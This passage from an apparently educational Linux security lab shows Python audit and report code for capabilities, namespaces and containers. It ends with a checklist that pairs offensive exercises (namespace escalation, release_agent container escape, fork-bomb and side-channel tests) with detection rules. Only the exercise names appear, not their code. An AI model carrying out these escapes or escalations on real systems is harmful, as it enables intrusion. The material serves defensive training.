            print(f"  [CRITICAL] {name}: host PID ns")

        sec_opts = hc.get("SecurityOpt") or []
        for opt in sec_opts:
            if "seccomp=unconfined" in opt:
                findings.append({
                    "category": "container",
                    "severity": "HIGH",
                    "message": f"Container '{name}': seccomp disabled",
                })
                print(f"  [HIGH] {name}: seccomp unconfined")

        memory = hc.get("Memory", 0)
        if memory == 0:
            findings.append({
                "category": "container",
                "severity": "MEDIUM",
                "message": f"Container '{name}': no memory limit",
            })

    return findings
```

#### `linuxsecaudit/report.py`

```python
"""Report generation and hardening recommendations."""
from collections import Counter


def print_summary(findings):
    print("\n" + "=" * 60)
    print("   AUDIT SUMMARY")
    print("=" * 60)

    if not findings:
        print("  No security findings.")
        return

    severity_counts = Counter(f["severity"] for f in findings)
    category_counts = Counter(f["category"] for f in findings)

    print("\n  By severity:")
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        count = severity_counts.get(sev, 0)
        if count:
            print(f"    {sev:>10s}: {count}")

    print("\n  By category:")
    for cat, count in category_counts.most_common():
        print(f"    {cat:>20s}: {count}")

    print(f"\n  Total findings: {len(findings)}")

    if severity_counts.get("CRITICAL", 0):
        print("\n  *** CRITICAL issues require immediate remediation ***")


def print_hardening(findings):
    print("\n" + "=" * 60)
    print("   HARDENING RECOMMENDATIONS")
    print("=" * 60)

    recommendations = {
        "capabilities": [
            "Drop ALL capabilities and add only required ones",
            "Use CapabilityBoundingSet= in systemd unit files",
            "Set NoNewPrivileges=yes for all services",
            "Audit file capabilities: getcap -r / 2>/dev/null",
        ],
        "namespaces": [
            "Set user.max_user_namespaces=0 unless rootless containers needed",
            "Use RestrictNamespaces=yes in systemd units",
            "Ensure mount propagation is 'private' for containers",
        ],
        "lsm": [
            "Enable SELinux enforcing or AppArmor enforce for all profiles",
            "Enable Landlock in boot LSM list: lsm=lockdown,yama,landlock,apparmor",
            "Set kernel lockdown=integrity for UEFI Secure Boot systems",
        ],
        "kernel": [
            "Enable CONFIG_STACKPROTECTOR_STRONG",
            "Enable CONFIG_KFENCE for production kernels",
            "Set kernel.yama.ptrace_scope=2",
            "Disable KSM in multi-tenant environments",
            "Encrypt swap devices with dm-crypt",
        ],
        "container": [
            "Never use --privileged in production",
            "Always use --cap-drop=ALL --cap-add=<specific>",
            "Set memory and PID limits on all containers",
            "Use read-only root filesystems where possible",
            "Apply Pod Security Standards (restricted) in Kubernetes",
        ],
    }

    affected_categories = set(f["category"] for f in findings) if findings else set(recommendations.keys())

    for category, recs in recommendations.items():
        if category in affected_categories or not findings:
            print(f"\n  [{category.upper()}]")
            for rec in recs:
                print(f"    • {rec}")
```

#### Build and Run

```bash
# Install the framework
cd linuxsecaudit
pip3 install -e .

# Run individual audits
linuxsecaudit caps
linuxsecaudit namespaces
linuxsecaudit lsm
linuxsecaudit kernel
linuxsecaudit containers

# Run full audit with all checks
sudo linuxsecaudit full

# Get hardening recommendations
sudo linuxsecaudit harden
```

---

## Lab Validation Checklist

### Offensive Exercises

| # | Exercise | Validation | Pass Criteria |
|---|----------|------------|---------------|
| 1 | Capability Inspector | Run `./cap_inspector` as user and root | Shows different cap sets, decodes all 41 capabilities |
| 2 | execve Transformation | Run `./execve_caps_demo` with and without setcap | Caps transform correctly across exec, ambient caps inherited |
| 3 | Ambient Capability Abuse | Run `./ambient_abuse python3 ...` | Python binds port 80 without file capabilities |
| 4 | Bounding Set Drop | Run `sudo ./bset_drop` | Caps dropped, sudo exec fails with NO_NEW_PRIVS |
| 5 | Namespace Creator | Run `./ns_creator` as user | Child in new namespaces, UID 0 inside, full caps in user ns |
| 6 | Namespace Enumeration | Run `ns_enum.sh` inside container | Identifies shared/isolated namespaces, escape indicators |
| 7 | User Namespace Escalation | Run `./userns_escape` as user | Gets root + caps in namespace, mounts tmpfs, fails on host device |
| 8 | Cgroup DoS | Run `cgroup_dos.sh` | Fork bomb stopped by pids.max, memory limited by memory.max |
| 9 | release_agent Escape | Run in container with CAP_SYS_ADMIN | Executes payload on host (pre-patch) or shows blocked (post-patch) |
| 10 | SELinux Recon | Run `selinux_recon.sh` on SELinux system | Lists permissive domains, dangerous booleans, unconfined processes |
| 11 | AppArmor Symlink Race | Run `aa_symlink_race.sh` | Shows race concept, AppArmor denials in dmesg, mitigation check |
| 12 | Landlock Sandbox | Run `./landlock_sandbox` as user | Sandbox enforced — /etc read-only, /root blocked, /tmp writable |
| 13 | Container Audit (Python) | Run `python3 container_audit.py` | Identifies privileged, shared-ns, missing-limits containers |
| 14 | KSM Side Channel | Run `./ksm_sidechannel` | Shows timing difference (if KSM enabled) or concept demo |

### Defensive Exercises

| # | Exercise | Validation | Pass Criteria |
|---|----------|------------|---------------|
| 15 | Audit Rules Deployment | Run `deploy_audit_rules.sh` | 25+ rules loaded, `auditctl -l` confirms |
| 16 | Audit Log Analyzer | Run `python3 caps_ns_analyzer.py` after triggering events | Events grouped by attack pattern with MITRE mapping |
| 17 | bpftrace Monitor | Run `caps_ns_monitor.bt` while triggering events | Real-time output showing unshare, mount, prctl events |
| 18 | systemd Hardening | Run `hardened_service_template.sh myapp` | Unit file generated, `systemd-analyze security` shows good score |
| 19 | AppArmor Profile Generator | Run `aa_profile_gen.py /usr/bin/curl` | Profile generated from strace with appropriate deny rules |
| 20 | Sysctl Hardening | Run `sysctl_hardening.sh` | All settings applied, verification passes |
| 21 | Falco Rules | Load `caps_ns_lsm.yaml`, trigger events | Falco alerts on namespace escape, cap modification, module load |
| 22 | Kernel Memory Audit | Run `kernel_mem_audit.sh` | Reports on KFENCE, KASAN, stack protector, KSM, swap encryption |

### Cross-Verification Matrix

| Offensive Exercise | Detected By |
|---|---|
| Ambient cap abuse (#3) | Audit rule `ambient_cap`, bpftrace PRCTL_CAP, Falco ambient raise |
| Namespace creation (#5) | Audit rule `ns_unshare`/`clone_newuser`, bpftrace UNSHARE |
| User namespace escalation (#7) | Audit rule `clone_newuser`, sysctl `max_user_namespaces` check |
| release_agent escape (#9) | Falco release_agent rule, audit rule `cgroup_write` |
| SELinux label manipulation (#10) | Audit rule `selinux_manage`, Falco SELinux mode change |
| Container privilege (#13) | Container audit script, Falco privileged container rule |
| KSM side channel (#14) | Kernel audit `ksm/run` check |

### Framework Verification

```bash
# Install and run full audit
cd linuxsecaudit && pip3 install -e .
sudo linuxsecaudit full

# Expected: audit covers caps, namespaces, cgroups, LSMs, containers, kernel
# Output: structured findings with severity, category, remediation
sudo linuxsecaudit harden
# Expected: category-specific hardening recommendations
```
